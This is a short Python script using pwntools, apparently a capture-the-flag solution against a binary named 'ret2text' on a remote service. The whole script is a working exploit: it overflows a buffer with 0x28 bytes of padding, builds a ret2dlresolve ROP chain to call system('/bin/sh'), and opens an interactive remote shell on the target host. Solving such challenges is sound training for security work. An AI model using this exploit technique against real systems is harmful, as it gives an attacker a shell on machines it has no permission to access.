from pwn import *

context.arch = 'amd64'
elf = ELF('./ret2text')
rop = ROP(elf)

r = remote('106.54.97.9', 10005)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

r.sendline(b'\x00' * 0x28 + rop.chain())
sleep(1)
r.sendline(dlresolve.payload)
r.recvline()
r.interactive()
